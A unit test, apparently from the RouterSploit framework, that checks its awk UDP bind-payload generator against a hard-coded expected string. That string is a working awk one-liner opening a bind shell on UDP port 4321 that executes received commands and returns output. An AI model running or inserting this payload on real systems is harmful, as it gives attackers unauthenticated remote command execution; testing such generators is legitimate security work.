from routersploit.modules.payloads.cmd.awk_bind_udp import Exploit


# awk bind udp payload with rport=4321
bind_udp = (
 "awk 'BEGIN{s=\"/inet/udp/4321/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Exploit()
    payload.rport = 4321

    assert payload.generate() == bind_udp
